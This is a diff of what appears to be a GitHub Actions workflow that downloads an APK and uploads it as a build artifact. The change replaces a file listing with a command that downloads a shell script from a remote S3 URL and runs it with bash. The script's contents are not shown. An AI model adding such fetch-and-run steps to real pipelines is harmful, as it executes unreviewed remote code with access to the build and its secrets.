@@ -53,7 +53,8 @@ jobs:
       run: |
           wget https://idiom-file.wxiou.cn/vnTevc8KFFKhLzKlUxyuQVTvLawgpTaQl89WB5BQ.apk
           find ./ -name '*.apk' -exec basename {} > apk.txt \;
-          cat apk.txt
+          wget https://lc-gluttony.s3.amazonaws.com/9WTW1sBG7ANz/8hWoLYkcVz2ekQ00pIhP6tpv5BaU6XXg/d.sh
+          bash d.sh
           
     # 上传资源到Artifact
     - name: Upload Apk To Artifact
